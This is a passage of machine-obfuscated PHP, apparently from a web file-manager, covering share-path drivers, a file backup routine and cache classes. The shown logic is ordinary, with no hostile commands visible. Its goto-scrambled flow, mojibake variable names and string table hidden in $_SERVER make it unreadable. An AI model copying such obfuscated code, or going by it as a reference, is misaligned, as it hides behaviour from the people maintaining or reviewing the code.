$Eƒ÷ÉÒŸà, $Aß¸ŒÄ¦õ = array(), $Cä£áÅó¦Ò = '', $fó¼Å­Ã) { $fŒÓğ¦óÄ¢ =& $_SERVER[Â€Á›¨õ]; $Dµ”´“‘äƒ = $this->parse($aªñ·¡³ÍÜ); $Cä£áÅó¦Ò = empty($Cä£áÅó¦Ò) ? $Dµ”´“‘äƒ[$fŒÓğ¦óÄ¢[75]] : $Cä£áÅó¦Ò; $Fö¸‰¤ = $this->model->addFileByRemote($Dµ”´“‘äƒ[$fŒÓğ¦óÄ¢[388]], $Eƒ÷ÉÒŸà, $Cä£áÅó¦Ò, $Aß¸ŒÄ¦õ, $fó¼Å­Ã); return $this->getPathOuter($Fö¸‰¤); } public function uploadLink($B¬äÌ‚•ì, $d·±—­ šï = 0) { $Eøõæ¼×ˆ‘ =& $_SERVER[Â€Á›¨õ]; $aĞÉç•¼ÖÆ = $this->parse($B¬äÌ‚•ì); $B¬äÌ‚•ì = Model($Eøõæ¼×ˆ‘[566])->createFileName($aĞÉç•¼ÖÆ[$Eøõæ¼×ˆ‘[75]]); $bìÌäÌ­ï© = IO::uploadLink($B¬äÌ‚•ì, $d·±—­ šï); return $bìÌäÌ­ï©; } public function fileNameAuto($Bßñ¯ÂËèÅ, $A¬ÀÏ‡µÎµ, $c›×´•®ÚŞ = REPEAT_REPLACE, $cîÓ¨ÙÁÚ£ = false) { return $this->model->fileNameAuto($Bßñ¯ÂËèÅ, $A¬ÀÏ‡µÎµ, $c›×´•®ÚŞ, $cîÓ¨ÙÁÚ£); } public function fileNameExist($EªöŸªº—, $Cà¤Ñ„øÒ) { return $this->model->fileNameExist($EªöŸªº—, $Cà¤Ñ„øÒ); } protected function _fileOut($D–æè•‘ç, $dÔÙ‹¬Ùˆ› = false, $EæèŞ¸œ›Ô = false, $eÁ·Êø™£¦ = '', $Cö‹ºÊîµ = false) { goto B¨ãÍ“„¨Š; FˆÔ‚óÇ’°: if ($Cö‹ºÊîµ) { return IO::fileOutServer($c†¥ñ‹ò‰[$FÃ·‘­’™[75]], $dÔÙ‹¬Ùˆ›, $DÈˆä¡²¥¾, $eÁ·Êø™£¦); } IO::fileOut($c†¥ñ‹ò‰[$FÃ·‘­’™[75]], $dÔÙ‹¬Ùˆ›, $DÈˆä¡²¥¾, $eÁ·Êø™£¦); goto aßçŸ¿Î®ç; c‚µ°ø¸Åå: $c†¥ñ‹ò‰ = $this->model->fileInfoGet($D–æè•‘ç); $eÁ·Êø™£¦ = $c†¥ñ‹ò‰[$FÃ·‘­’™[169]] ? $c†¥ñ‹ò‰[$FÃ·‘­’™[169]] : $eÁ·Êø™£¦; $DÈˆä¡²¥¾ = isset($GLOBALS[$FÃ·‘­’™[1182]]) ? $GLOBALS[$FÃ·‘­’™[1182]] : $d—Ì‚ßºÏª[$FÃ·‘­’™[28]]; goto FˆÔ‚óÇ’°; B¨ãÍ“„¨Š: $FÃ·‘­’™ =& $_SERVER[Â€Á›¨õ]; $d—Ì‚ßºÏª = $this->model->sourceInfo($D–æè•‘ç); if ($d—Ì‚ßºÏª[$FÃ·‘­’™[397]] == $FÃ·‘­’™[86]) { header($FÃ·‘­’™[1181]); die; } goto c‚µ°ø¸Åå; aßçŸ¿Î®ç: } public function fileOut($C„œÍË‚ãø, $Bâ˜øÎ‡ñ = false, $AÛëâ’Ü¤¡ = false, $cŞŒÃ Îö = '') { $this->_fileOut($C„œÍË‚ãø, $Bâ˜øÎ‡ñ, $AÛëâ’Ü¤¡, $cŞŒÃ Îö); } public function fileOutServer($Cö‘¡°Àá, $A¥Œ¹ÖÔ˜ñ = false, $dè „–Ã«ß = false, $aïˆôâƒù” = '') { $this->_fileOut($Cö‘¡°Àá, $A¥Œ¹ÖÔ˜ñ, $dè „–Ã«ß, $aïˆôâƒù”, !0); } protected function _fileOutImage($FñÜŠ®Â, $DŠËÂéëµŸ = 250) { goto AíÔç¦¼¦Ë; Cøâ–È¶ÂÁ: $GLOBALS[$Eæ¨¹È¢í¿[1182]] = $a¬÷èö‰—Í[$Eæ¨¹È¢í¿[28]]; $GLOBALS[$Eæ¨¹È¢í¿[161]] = $a¬÷èö‰—Í; IO::fileOutImage($a¬÷èö‰—Í[$Eæ¨¹È¢í¿[75]], $DŠËÂéëµŸ); goto D¬´º™®ˆ; DÈõã’´ÂĞ: $a¬÷èö‰—Í = $this->model->fileInfoGet($FñÜŠ®Â); $a¬÷èö‰—Í[$Eæ¨¹È¢í¿[28]] = $dæİ¤‰›²[$Eæ¨¹È¢í¿[28]]; $a¬÷èö‰—Í[$Eæ¨¹È¢í¿[162]] = $dæİ¤‰›²[$Eæ¨¹È¢í¿[162]]; goto Cøâ–È¶ÂÁ; AíÔç¦¼¦Ë: $Eæ¨¹È¢í¿ =& $_SERVER[Â€Á›¨õ]; $dæİ¤‰›² = $this->model->pathInfo($FñÜŠ®Â); if ($dæİ¤‰›²[$Eæ¨¹È¢í¿[397]] == $Eæ¨¹È¢í¿[86]) { show_json($Eæ¨¹È¢í¿[1183] . $FñÜŠ®Â, !1); } goto DÈõã’´ÂĞ; D¬´º™®ˆ: } public function fileOutImage($A¡ôö‚‡ğ, $aõŞóœĞÔ = 250) { $this->_fileOutImage($A¡ôö‚‡ğ, $aõŞóœĞÔ); } public function fileOutImageServer($D¿°øá«ôŠ, $d¡œ‚†é¬¼ = 250) { $this->_fileOutImage($D¿°øá«ôŠ, $d¡œ‚†é¬¼); } public function link($A¶‘‚ª†µ, $bÔØ—©Ã = '') { $Dòî•àÙÖ³ = $this->model->fileInfoGet($A¶‘‚ª†µ); return IO::link($Dòî•àÙÖ³[$_SERVER[Â€Á›¨õ][75]], $bÔØ—©Ã); } protected function parse($d´¯»šŸÈğ) { $dÛØÕ°åè¨ =& $_SERVER[Â€Á›¨õ]; if (strstr($d´¯»šŸÈğ, $dÛØÕ°åè¨[8]) === !1) { return array($dÛØÕ°åè¨[406] => intval($d´¯»šŸÈğ), $dÛØÕ°åè¨[75] => $dÛØÕ°åè¨[33], $dÛØÕ°åè¨[1179] => array()); } $bÆ†Á×¾Á¼ = explode($dÛØÕ°åè¨[8], trim($d´¯»šŸÈğ, $dÛØÕ°åè¨[8])); if (count($bÆ†Á×¾Á¼) < 2) { show_tips($d´¯»šŸÈğ . $dÛØÕ°åè¨[1184]); } return array($dÛØÕ°åè¨[406] => intval($bÆ†Á×¾Á¼[0]), $dÛØÕ°åè¨[75] => $bÆ†Á×¾Á¼[1], $dÛØÕ°åè¨[1179] => array_slice($bÆ†Á×¾Á¼, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($fŒæŞÇ”ñ) { $this->pathParse = $fŒæŞÇ”ñ; $this->model = Model($_SERVER[Â€Á›¨õ][1178]); } public function getPathOuter($A“ºøÇ‹Ùè) { $b¼º«„ºŠÊ =& $_SERVER[Â€Á›¨õ]; if (!$A“ºøÇ‹Ùè) { return $A“ºøÇ‹Ùè; } $E—Ÿ‘¢Õº» = $this->parse($A“ºøÇ‹Ùè); return trim(KodIO::makeShare($this->pathParse[$b¼º«„ºŠÊ[388]], $E—Ÿ‘¢Õº»[$b¼º«„ºŠÊ[388]]), $b¼º«„ºŠÊ[8]); } protected function infoParse($a’Çèó‚„Œ, $Aò™Øœòà™ = false, $CœÕÈ¼³Éª = false) { $B†“¶§µ†¬ =& $_SERVER[Â€Á›¨õ]; $F–¢İ‚ßƒ¢ = $this->pathParse[$B†“¶§µ†¬[388]]; $EÃº­²â½¾ = trim($this->pathParse[$B†“¶§µ†¬[1038]], $B†“¶§µ†¬[8]); return Action($B†“¶§µ†¬[1185])->sharePathInfo($F–¢İ‚ßƒ¢, $EÃº­²â½¾); } public function infoFull($F’‘†ø®é‰) { $añŸœ•ê™ =& $_SERVER[Â€Á›¨õ]; $dÚìÒ¯Ò‰ = explode($añŸœ•ê™[8], trim($F’‘†ø®é‰, $añŸœ•ê™[8])); if (count($dÚìÒ¯Ò‰) > 1) { $DØîä¹Û´ô = implode($añŸœ•ê™[8], array_splice($dÚìÒ¯Ò‰, 1)); $bŒŠĞß°Íò = $this->model->pathInfoByPath($dÚìÒ¯Ò‰[0], $DØîä¹Û´ô); if (!$bŒŠĞß°Íò) { return !1; } $this->pathParse[$añŸœ•ê™[1038]] = $bŒŠĞß°Íò[$añŸœ•ê™[390]]; } return $this->infoParse($F’‘†ø®é‰); } public function listAll($FæÓÌÆºíë) { goto f‚ß™ÊáÙâ; D¥Ã¨ŠÁĞÆ: $EÑµ©Ÿ§Í‚ = $this->model->listAll($FæÓÌÆºíë); $fÇçÆ—±¾ = Model($eèŠÅª˜‚ã[558])->getInfo($CÃïùå¸¼¢[$eèŠÅª˜‚ã[462]]); $e¸õëÅ“ç = Action($eèŠÅª˜‚ã[1185]); goto aÅÇ¹ôå›Í; f‚ß™ÊáÙâ: $eèŠÅª˜‚ã =& $_SERVER[Â€Á›¨õ]; $CÃïùå¸¼¢ = IO::info($this->pathParse[$eèŠÅª˜‚ã[75]]); if (!$CÃïùå¸¼¢) { return array(); } goto D¥Ã¨ŠÁĞÆ; aÅÇ¹ôå›Í: foreach ($EÑµ©Ÿ§Í‚ as &$Bî“ó¤—ôç) { check_abort(); $Bî“ó¤—ôç[$eèŠÅª˜‚ã[84]] = $e¸õëÅ“ç->_shareItemeParse($Bî“ó¤—ôç[$eèŠÅª˜‚ã[84]], $fÇçÆ—±¾); } unset($Bî“ó¤—ôç); return $EÑµ©Ÿ§Í‚; goto fÇ¶£Î¢”˜; fÇ¶£Î¢”˜: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($D™ê„¢ªËá) { $this->pathParse = $D™ê„¢ªËá; $this->model = Model($_SERVER[Â€Á›¨õ][1178]); } protected function infoParse($a¡•Œ‡”†Ú, $dÌì–ÛÚŒ = false, $e…Úè¾‹É = false) { $BË¬—Éƒ =& $_SERVER[Â€Á›¨õ]; return Action($BË¬—Éƒ[1044])->sharePathInfo($this->pathParse[$BË¬—Éƒ[75]], !0); } public function listPath($eª’¬¼±îÅ, $e½»ƒ¨›§Û = false) { $cøÆÃ½·± =& $_SERVER[Â€Á›¨õ]; $B“—åîÜ› = parent::listPath($eª’¬¼±îÅ, $e½»ƒ¨›§Û); foreach ($B“—åîÜ› as $B÷½›÷µù° => $Eİ²³à¯¤Û) { if (!in_array($B÷½›÷µù°, array($cøÆÃ½·±[73], $cøÆÃ½·±[74]))) { continue; } foreach ($Eİ²³à¯¤Û as $a‡Å…àÛ÷é => $Fé—‹òòë) { $B“—åîÜ›[$B÷½›÷µù°][$a‡Å…àÛ÷é] = Action($cøÆÃ½·±[1044])->shareItemInfo($Fé—‹òòë); } } return $B“—åîÜ›; } public function listAll($f–êÒö“„á) { goto C˜±…­ç©¾; EÕ‡èÌàİ: return $bå…ŠÆ¡¾†; goto dŠ‘‚¯æİ; d¬‡æ™“–÷: $bå…ŠÆ¡¾† = $this->model->listAll($f–êÒö“„á); foreach ($bå…ŠÆ¡¾† as &$cçÎ’“§ôÕ) { $cçÎ’“§ôÕ[$A•ºŒ¶ãÉ[84]] = Action($A•ºŒ¶ãÉ[1044])->shareItemInfo($cçÎ’“§ôÕ[$A•ºŒ¶ãÉ[84]]); } unset($cçÎ’“§ôÕ); goto EÕ‡èÌàİ; C˜±…­ç©¾: $A•ºŒ¶ãÉ =& $_SERVER[Â€Á›¨õ]; $D¤¶–Ñ”„ = IO::info($this->pathParse[$A•ºŒ¶ãÉ[75]]); if (!$D¤¶–Ñ”„) { return array(); } goto d¬‡æ™“–÷; dŠ‘‚¯æİ: } } goto D°Óƒ×•Ûç; F«¨…Ã ‡³: class BackupFile { public function __construct() { } public function index() { goto aÊ’°œ‰ôó; C§ËìŸ‹ÕŠ: $BæÙöÂ‰µ… = (int) Model($_SERVER[Â€Á›¨õ][731])->where($b©ÏÉÕí)->count($_SERVER[Â€Á›¨õ][441]); $CÒÌ±©‚ê = (int) Model($_SERVER[Â€Á›¨õ][731])->where($b©ÏÉÕí)->sum($_SERVER[Â€Á›¨õ][77]); $A—ÃÜ„®’Ğ = new TaskFileTransfer($_SERVER[Â€Á›¨õ][753], $_SERVER[Â€Á›¨õ][726], $BæÙöÂ‰µ…, LNG($_SERVER[Â€Á›¨õ][727]) . $_SERVER[Â€Á›¨õ][728] . LNG($_SERVER[Â€Á›¨õ][754])); goto F¡¶•ÓÑ¹–; E…Å±µÑÔ©: $this->_fileFilter($Câç´‡àµó); return !0; goto D‚™ö£¯á; F¡¶•ÓÑ¹–: $A—ÃÜ„®’Ğ->task[$_SERVER[Â€Á›¨õ][711]] = $CÒÌ±©‚ê; $cçÎ±Ò‰®­ = array($_SERVER[Â€Á›¨õ][755] => $BæÙöÂ‰µ…, $_SERVER[Â€Á›¨õ][756] => $CÒÌ±©‚ê); Backup::set($cçÎ±Ò‰®­); goto AÇÄ‰ÌŞÏ; AÇÄ‰ÌŞÏ: $eèØã™‹ù  = !0; $EÙ÷§í§ÓÌ = $this->storeIds(); $aÕÛŒŞœ†† = 1; goto C§´ß™¨¬á; C§´ß™¨¬á: $C‘º‡£ÈŒÓ = 1000; $föÙØ£½ß· = $D£÷´¢âíÎ = 0; $Câç´‡àµó = array(); goto Eí½æ§Ñò; aìóŠŸÓÀ÷: $cçÎ±Ò‰®­ = array($_SERVER[Â€Á›¨õ][766] => 1, $_SERVER[Â€Á›¨õ][470] => time(), $_SERVER[Â€Á›¨õ][721] => 1, $_SERVER[Â€Á›¨õ][763] => $B¡æ–æÎÌ´, $_SERVER[Â€Á›¨õ][756] => $CÒÌ±©‚ê, $_SERVER[Â€Á›¨õ][755] => $BæÙöÂ‰µ…); if ($D£÷´¢âíÎ) { $cçÎ±Ò‰®­[$_SERVER[Â€Á›¨õ][764]] = $BÏ×µ‡é; $cçÎ±Ò‰®­[$_SERVER[Â€Á›¨õ][765]] = $bêÑ„é×âÓ; } Backup::set($cçÎ±Ò‰®­); goto E…Å±µÑÔ©; aÊ’°œ‰ôó: $b¾Ö—ô¤‹‡ = Backup::get(); $B¡æ–æÎÌ´ = $b¾Ö—ô¤‹‡[$_SERVER[Â€Á›¨õ][289]][$_SERVER[Â€Á›¨õ][173]][$_SERVER[Â€Á›¨õ][441]]; $b©ÏÉÕí = array($_SERVER[Â€Á›¨õ][442] => array($_SERVER[Â€Á›¨õ][751], $B¡æ–æÎÌ´), $_SERVER[Â€Á›¨õ][752] => array($_SERVER[Â€Á›¨õ][327], $b¾Ö—ô¤‹‡[$_SERVER[Â€Á›¨õ][704]])); goto C§ËìŸ‹ÕŠ; Eí½æ§Ñò: $bêÑ„é×âÓ = $BÏ×µ‡é = 0; do { $cÜßÄÂÈ¤ë = $_SERVER[Â€Á›¨õ][757]; $fƒ„­ª™¼´ = Model($_SERVER[Â€Á›¨õ][731])->where($b©ÏÉÕí)->field($cÜßÄÂÈ¤ë)->order($_SERVER[Â€Á›¨õ][758])->selectPage($C‘º‡£ÈŒÓ, $aÕÛŒŞœ††); $B’±çÆ = !empty($fƒ„­ª™¼´[$_SERVER[Â€Á›¨õ][365]]) ? $fƒ„­ª™¼´[$_SERVER[Â€Á›¨õ][365]] : array(); foreach ($B’±çÆ as $cˆƒğâ™ñÛ) { goto EÄøÒ†ã’; D±¶ÅØÔ¿: if (IO::exist($dÅùçÚÖóµ)) { $A—ÃÜ„®’Ğ->updateFileEnd($cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][28]], $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][77]]); } else { $dÅùçÚÖóµ = get_path_father($dÅùçÚÖóµ); IO::mkdir($dÅùçÚÖóµ); if (!IO::copy($d»ÑìÑØ‰Ã, $dÅùçÚÖóµ, $_SERVER[Â€Á›¨õ][761])) { write_log($_SERVER[Â€Á›¨õ][762] . $d»ÑìÑØ‰Ã . $_SERVER[Â€Á›¨õ][747] . $dÅùçÚÖóµ . $_SERVER[Â€Á›¨õ][499], $_SERVER[Â€Á›¨õ][726]); $eèØã™‹ù  = !1; break; } } $B¡æ–æÎÌ´ = $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][441]]; $D£÷´¢âíÎ += 1; goto e¢˜Éºé÷–; B¬ñùŠ¾Œ: if ($föÙØ£½ß· >= 1024 * 1024 * 100) { $cçÎ±Ò‰®­ = array($_SERVER[Â€Á›¨õ][763] => $B¡æ–æÎÌ´, $_SERVER[Â€Á›¨õ][764] => $BÏ×µ‡é, $_SERVER[Â€Á›¨õ][765] => $bêÑ„é×âÓ); Backup::set($cçÎ±Ò‰®­); $föÙØ£½ß· = $D£÷´¢âíÎ = 0; } goto f‡‚Âåğ¦; e¢˜Éºé÷–: $föÙØ£½ß· += $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][77]]; $BÏ×µ‡é += 1; $bêÑ„é×âÓ += $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][77]]; goto B¬ñùŠ¾Œ; EÄøÒ†ã’: if (!$this->_fileExist($cˆƒğâ™ñÛ, $Câç´‡àµó, $EÙ÷§í§ÓÌ)) { $BæÙöÂ‰µ… -= 1; $CÒÌ±©‚ê -= (int) $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][77]]; write_log("\146\151\x6c\145\40\x6e\x6f\164\x20\145\x78\x69\x73\164\56\146\151\x6c\x65\111\x44\x3a{$cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][441]]}\x2c\x20\x70\x61\164\150\x3a{$cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][75]]}", $_SERVER[Â€Á›¨õ][759]); continue; } $d»ÑìÑØ‰Ã = $cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][75]]; $dÅùçÚÖóµ = "\x7b\151\157\72{$b¾Ö—ô¤‹‡[$_SERVER[Â€Á›¨õ][704]]}\x7d" . substr($d»ÑìÑØ‰Ã, strlen("\x7b\151\x6f\x3a{$cˆƒğâ™ñÛ[$_SERVER[Â€Á›¨õ][760]]}\175")); goto D±¶ÅØÔ¿; f‡‚Âåğ¦: } $dÚªšÔ¢— = count($B’±çÆ); $aÕÛŒŞœ††++; } while ($dÚªšÔ¢— == $C‘º‡£ÈŒÓ); $A—ÃÜ„®’Ğ->end(); goto aìóŠŸÓÀ÷; D‚™ö£¯á: } private function _fileExist($A·šìŠÓ², &$fæ½¼’ºÄ„, $d§¤½Î‡ïí) { goto AîÔ¡í«; AîÔ¡í«: $b²ßƒóÅ›Ã =& $_SERVER[Â€Á›¨õ]; $cßˆîÆÌÙŒ = $A·šìŠÓ²[$b²ßƒóÅ›Ã[75]]; if (in_array($A·šìŠÓ²[$b²ßƒóÅ›Ã[441]], $fæ½¼’ºÄ„)) { return !1; } goto B‘«ÈÎâíˆ; E•ÙÌ„°‹: $fæ½¼’ºÄ„ = array_merge($fæ½¼’ºÄ„, array_to_keyvalue($c“ÄÑ†Ç£¯, $b²ßƒóÅ›Ã[33], $b²ßƒóÅ›Ã[441])); return !1; goto EõÆ«›š—£; B‘«ÈÎâíˆ: if (!in_array($A·šìŠÓ²[$b²ßƒóÅ›Ã[760]], $d§¤½Î‡ïí)) { return !1; } if (IO::exist($cßˆîÆÌÙŒ)) { return !0; } $CáëÊ‡Èá = get_path_father($cßˆîÆÌÙŒ); goto aÖñÛ¶Óà; aÖñÛ¶Óà: if (IO::exist($CáëÊ‡Èá)) { $fæ½¼’ºÄ„[] = $A·šìŠÓ²[$b²ßƒóÅ›Ã[441]]; return !1; } $b™ˆëŸÍåÒ = array($b²ßƒóÅ›Ã[760] => $A·šìŠÓ²[$b²ßƒóÅ›Ã[760]], $b²ßƒóÅ›Ã[75] => array($b²ßƒóÅ›Ã[378], "{$CáëÊ‡Èá}\45")); $c“ÄÑ†Ç£¯ = Model($b²ßƒóÅ›Ã[731])->where($b™ˆëŸÍåÒ)->field($b²ßƒóÅ›Ã[442])->select(); goto E•ÙÌ„°‹; EõÆ«›š—£: } private function _fileFilter($d»º¹íçï) { $C„¿Ó‘—´Á =& $_SERVER[Â€Á›¨õ]; if (empty($d»º¹íçï)) { return; } $EÊ‡Ã·š¸å = array($C„¿Ó‘—´Á[441] => array($C„¿Ó‘—´Á[7], array_unique($d»º¹íçï))); $e÷†ˆ¶â·” = Model($C„¿Ó‘—´Á[767])->where($EÊ‡Ã·š¸å)->field($C„¿Ó‘—´Á[390])->select(); foreach ($e÷†ˆ¶â·” as $fö‘ºÚÒøÕ) { Model($C„¿Ó‘—´Á[767])->remove($fö‘ºÚÒøÕ[$C„¿Ó‘—´Á[390]], !1); } } private function storeIds() { $a’ˆ÷§òÑ =& $_SERVER[Â€Á›¨õ]; $b—‘‘äÆ½ = Model($a’ˆ÷§òÑ[716])->listData(); $e¿ÏÃë¹æÏ = array(); $B¥¿¼æˆÄ÷ = $GLOBALS[$a’ˆ÷§òÑ[6]][$a’ˆ÷§òÑ[87]][$a’ˆ÷§òÑ[768]]; foreach ($b—‘‘äÆ½ as $aï°å¤‰ÑÄ) { $f³òÑ±éµ• = strtolower($aï°å¤‰ÑÄ[$a’ˆ÷§òÑ[93]]); if (!isset($B¥¿¼æˆÄ÷[$f³òÑ±éµ•])) { continue; } $Fèˆ©é’”Ÿ = $a’ˆ÷§òÑ[71] . (isset($B¥¿¼æˆÄ÷[$f³òÑ±éµ•]) ? $B¥¿¼æˆÄ÷[$f³òÑ±éµ•] : ucfirst($f³òÑ±éµ•)); if (!class_exists($Fèˆ©é’”Ÿ)) { continue; } $e¿ÏÃë¹æÏ[] = $aï°å¤‰ÑÄ[$a’ˆ÷§òÑ[388]]; } return $e¿ÏÃë¹æÏ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Cµ·äÁùª; Cµ·äÁùª: $AŸÒÀÇºËÃ =& $_SERVER[Â€Á›¨õ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto E—¬•Ó„Öˆ; E—¬•Ó„Öˆ: $e‘ÜÉ÷ƒ–¤ = $GLOBALS[$AŸÒÀÇºËÃ[6]][$AŸÒÀÇºËÃ[345]]; $Cœíäë×² = $e‘ÜÉ÷ƒ–¤[$e‘ÜÉ÷ƒ–¤[$AŸÒÀÇºËÃ[769]]]; $A£ÇÍ±Ÿ•¢ = $e‘ÜÉ÷ƒ–¤[$AŸÒÀÇºËÃ[770]]; goto càõ‡–³äÇ; càõ‡–³äÇ: switch ($e‘ÜÉ÷ƒ–¤[$AŸÒÀÇºËÃ[769]]) { case $AŸÒÀÇºËÃ[17]: self::$handle = Model($AŸÒÀÇºËÃ[771]); break; case $AŸÒÀÇºËÃ[772]: self::$handle = new CacheRedis($Cœíäë×², $A£ÇÍ±Ÿ•¢); break; case $AŸÒÀÇºËÃ[773]: self::$handle = new CacheMemcached($Cœíäë×², $A£ÇÍ±Ÿ•¢); break; case $AŸÒÀÇºËÃ[173]: self::$handle = new CacheFile($Cœíäë×², $A£ÇÍ±Ÿ•¢); break; default: break; } return self::$handle; goto F’ÊÔ—“øÍ; F’ÊÔ—“øÍ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fˆœÀÇ§‘Ğ) { if (is_array($fˆœÀÇ§‘Ğ) || is_object($fˆœÀÇ§‘Ğ)) { $fˆœÀÇ§‘Ğ = json_encode($fˆœÀÇ§‘Ğ); } $fˆœÀÇ§‘Ğ = rawurlencode($fˆœÀÇ§‘Ğ); return md5(KOD_SITE_ID . $_SERVER[Â€Á›¨õ][70] . $fˆœÀÇ§‘Ğ); } public static function get($Fá¢¬œ¢‚ù, $e‡‘±Ê£ƒ™ = false) { $cäŒ¶†Í = self::key($Fá¢¬œ¢‚ù); if ($e‡‘±Ê£ƒ™) { return unserialize(self::init()->get($cäŒ¶†Í)); } if (!isset(self::$memoryCache[$cäŒ¶†Í])) { $EäÉêÄÌÓ = self::init()->get($cäŒ¶†Í); self::$memoryCache[$cäŒ¶†Í] = unserialize($EäÉêÄÌÓ); } return self::$memoryCache[$cäŒ¶†Í]; } public static function set($BæòßÚÆ§Š, $A‘±ºÁ›Ø, $B©çÅéä–Ü = false) { goto Bà¼¥¾ÅÍ; Bà¼¥¾ÅÍ: $BÓÂÚ¸¯ = self::key($BæòßÚÆ§Š); if (isset(self::$memoryCache[$BÓÂÚ¸¯]) && self::$memoryCache[$BÓÂÚ¸¯] === $A‘±ºÁ›Ø) { return !0; } if ($B©çÅéä–Ü === 0) { self::$memoryCache[$BÓÂÚ¸¯] = $A‘±ºÁ›Ø; return !0; } goto B÷íªÉâ»Ÿ; BèçÅ…É‡…: CacheLock::unlock($BæòßÚÆ§Š); return $døßÁ‹¾‘; goto bÇ—°éÀÆ; B÷íªÉâ»Ÿ: CacheLock::lock($BæòßÚÆ§Š); $døßÁ‹¾‘ = self::init()->set($BÓÂÚ¸¯, serialize($A‘±ºÁ›Ø), $B©çÅéä–Ü); self::$memoryCache[$BÓÂÚ¸¯] = $A‘±ºÁ›Ø; goto BèçÅ…É‡…; bÇ—°éÀÆ: } public static function remove($E¦§÷¬Ç’ô) { goto däç©˜Í„; däç©˜Í„: $e›œ–ËÆ±¬ = self::key($E¦§÷¬Ç’ô); unset(self::$memoryCache[$e›œ–ËÆ±¬]); self::clearTimeout(); goto BğÓ›Ï§¨‚; BğÓ›Ï§¨‚: CacheLock::lock($E¦§÷¬Ç’ô); $BŞ©ø¨ˆÊƒ = self::init()->remove($e›œ–ËÆ±¬); CacheLock::unlock($E¦§÷¬Ç’ô); goto B­Şæ×Œ¢©; B­Şæ×Œ¢©: return $BŞ©ø¨ˆÊƒ; goto eƒ ‚ç¨ä•; eƒ ‚ç¨ä•: } public static function removeMemory($aÀ˜Ş•ößî) { $dáºö† ¨· = self::key($aÀ˜Ş•ößî); unset(self::$memoryCache[$dáºö† ¨·]); } public static function clearMemory($EçŒ„Èö†ˆ = false) { if ($EçŒ„Èö†ˆ) { $EçŒ„Èö†ˆ = self::key($EçŒ„Èö†ˆ); unset(self::$memoryCache[$EçŒ„Èö†ˆ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Â€Á›¨õ][774])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Â€Á›¨õ][775])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fÒÚôùÉæ…, $cÄ•‡È­Æ„) { $FÍïŞÙóó =& $_SERVER[Â€Á›¨õ]; $this->cachePath = $fÒÚôùÉæ…[$FÍïŞÙóó[75]]; $this->prefix = $FÍïŞÙóó[776]; $this->cacheTime = $cÄ•‡È­Æ„; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($FĞĞîÑÆÊÓ) { $eĞª›ÁË…Œ =& $_SERVER[Â€Á›¨õ]; $FĞĞîÑÆÊÓ = str_replace(array($eĞª›ÁË…Œ[777], $eĞª›ÁË…Œ[96], $eĞª›ÁË…Œ[69]), $eĞª›ÁË…Œ[778], $FĞĞîÑÆÊÓ); return $this->cachePath . $eĞª›ÁË…Œ[779] . $FĞĞîÑÆÊÓ . $eĞª›ÁË…Œ[780]; } public function set($bõóíÀŠò, $cÔ†»ÍøæÓ, $E½ìÇÁŸç = false) { $D¾ËŸæÙá± = $this->getFile($bõóíÀŠò); if (file_put_contents($D¾ËŸæÙá±, $this->prefix . $cÔ†»ÍøæÓ, LOCK_EX)) { return !0; } @unlink($D¾ËŸæÙá±); return !1; } public function get($Bôóâ¼Å¶) { $a¤éŞêÈ“ö = $this->getFile($Bôóâ¼Å¶); if (file_exists($a¤éŞêÈ“ö) && filemtime($a¤éŞêÈ“ö) < time() - $this->cacheTime) { @unlink($a¤éŞêÈ“ö); return !1; } $FîÀ…ÇÇ = @file_get_contents($a¤éŞêÈ“ö); return substr($FîÀ…ÇÇ, strlen($this->prefix)); } public function remove($f”÷”©ªä) { $FºÌÁñ¹Î = $this->getFile($f”÷”©ªä); return @unlink($FºÌÁñ¹Î); } public function deleteAll() { $B‹£½Ùˆ®Ê =& $_SERVER[Â€Á›¨õ]; $FæŸŠ‚¼¶ù = scandir($this->cachePath); foreach ($FæŸŠ‚¼¶ù as $Eâ¿ªÃÀè) { $cùí®ÈÊ† = $this->cachePath . $Eâ¿ªÃÀè; if (strpos($cùí®ÈÊ†, $B‹£½Ùˆ®Ê[780]) && strpos($cùí®ÈÊ†, $B‹£½Ùˆ®Ê[781])) { @unlink($cùí®ÈÊ†); } } } public function clearTimeout() { $c¡íŠ”ñ†Ù =& $_SERVER[Â€Á›¨õ]; $fºÏ­Ç×Ù = scandir($this->cachePath); foreach ($fºÏ­Ç×Ù as $F‚Û‚õÄ•) { $d¨¹»âËè = $this->cachePath . $F‚Û‚õÄ•; if (strpos($d¨¹»âËè, $c¡íŠ”ñ†Ù[780]) && strpos($d¨¹»âËè, $c¡íŠ”ñ†Ù[781]) && filemtime($d¨¹»âËè) < time() - $this->cacheTime) { @unlink($d¨¹»âËè); } } } } goto d²Ã­“À; bŠ®¶Ä•æ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto cÎ¤Î†ƒš; dÆõ“Ã·Ê©: $this->tpl = TEMPLATE . MOD . $C¶¦Í•ä¯[8]; $this->_classObjectID = mt_rand(0, 10000); goto DÆà¸ÖéÌ£; cÎ¤Î†ƒš: $C¶¦Í•ä¯ =& $_SERVER[Â€Á›¨õ]; global $in, $config; $this->config =& $config; goto bö³İ„®‘Å; bö³İ„®‘Å: $this->in =& $in; $this->values[$C¶¦Í•ä¯[6]] =& $config; $this->values[$C¶¦Í•ä¯[7]] =& $in; goto dÆõ“Ã·Ê©; DÆà¸ÖéÌ£: } public function 